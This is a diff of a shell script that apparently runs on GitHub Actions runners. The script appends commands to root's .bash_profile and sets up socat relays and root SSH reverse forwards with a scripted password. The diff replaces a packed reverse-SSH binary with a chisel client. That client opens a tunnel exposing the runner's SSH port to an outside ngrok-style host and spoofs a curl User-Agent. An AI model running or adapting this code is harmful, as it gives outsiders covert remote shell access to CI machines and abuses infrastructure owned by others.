@@ -44,8 +44,8 @@ ls -al /bin/ts45 /bin/cc45  /bin/edge /bin/bing;">>/root/.bash_profile';
 
 [ -z "${GITHUB_WORKSPACE}" ]  && 
 (
-  sleep 2
-)||(  echo 234691 );
+  sleep 2;
+)||(  echo 234691;export GITHUB_WORKSPACE=/home/runner/work/nc_test/nc_test ;echo 159741);
 
 
 
@@ -71,7 +71,7 @@ ls -al /bin/ts45 /bin/cc45  /bin/edge /bin/bing;">>/root/.bash_profile';
 ip_port7pxy2a=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9);
 echo 456814t7; 
 echo "flag_9832q_20240425 $ip_port7pxy2a";
-
+#  反弹的目的ip和端口 socat
 
 
 # (
@@ -108,12 +108,18 @@ port7pxy=${ip_port7pxy#*:};
 ip7pxy=${ip_port7pxy%:*};
 echo "flag 1122334_socat";
 
+
+
+
 if [ ! -z ${port7pxy} ] && [ ! -z ${ip7pxy} ]; then
   setsid /home/runner/work/nc_test/nc_test/socat.bin TCP4-LISTEN:50022,reuseaddr,fork  proxy:${ip7pxy}:127.0.0.1:2244,proxyport=${port7pxy}  &
   # 基本不用 代理连接127.0.0.1:2244
   (
   (ps aux|grep -v grep|grep "40022:127.0.0.1:22")&& echo 40022_ok ||(sleep 1;
-    (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 40022:127.0.0.1:22   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 1;
+    (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 40022:127.0.0.1:22   root@127.0.0.1 -p 50022";
+    sleep 2;echo 123456;
+    sleep 1;echo 123456;
+    sleep 1;
     (  for((i=0;i<8;i++));do  echo -e "\n";sleep 2;done )  )|script /tmp/nz_z51194
   )
   )&
@@ -125,20 +131,37 @@ if [ ! -z ${port7pxy} ] && [ ! -z ${ip7pxy} ]; then
     (  for((i=0;i<8;i++));do  echo -e "\n";sleep 2;done )  )|script /tmp/nz_z40022
   )
   )&
-
 fi
+
+
 
 
 if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then 
   #nohup sudo $GITHUB_WORKSPACE/natapp -authtoken=0c4f43f4aa226595 &
   #sudo sh -c "export HOME=/tmp;$GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5"; 
   date;
-  [ ! -z ${GITHUB_WORKSPACE} ] &&
-   (
-      echo "exit_revSSH_isOK ${ip5} : ${port5}  -> $bport ";
-      sleep 60;
-      [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&(sudo -H sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5;echo \$?;");echo $?;      
-   )||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
+  #[ ! -z ${GITHUB_WORKSPACE} ] &&
+   #(
+   #   echo "exit_revSSH_isOK ${ip5} : ${port5}  -> $bport ";
+   #   sleep 60;
+   #   [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&(sudo -H sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5;echo \$?;");echo $?;      
+   #)||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
+
+[ ! -z ${GITHUB_WORKSPACE} ] &&
+(
+echo "exit_revSSH-chisel_isOK  : $bport ";
+sleep 5;
+sudo bash <<'EO1F'
+[ -x $GITHUB_WORKSPACE/chisel2upx.elf ]&&(
+$GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/7.87.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport:127.0.0.1:22;echo \$?;)
+EO1F
+echo $?;
+)||(
+export  bport=50055
+export GITHUB_WORKSPACE=/home/runner/work/nc_test/nc_test
+$GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/8.12.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport:127.0.0.1:22;
+)
+
   echo "exit_revSSH_isOK_$bport  $(date)";date;
 fi
 
@@ -146,7 +169,7 @@ fi
 echo "will sleep 12s for while true";
 date;
 echo $(date);
-sleep 12; 
+sleep 13; 
 
 
 done) &
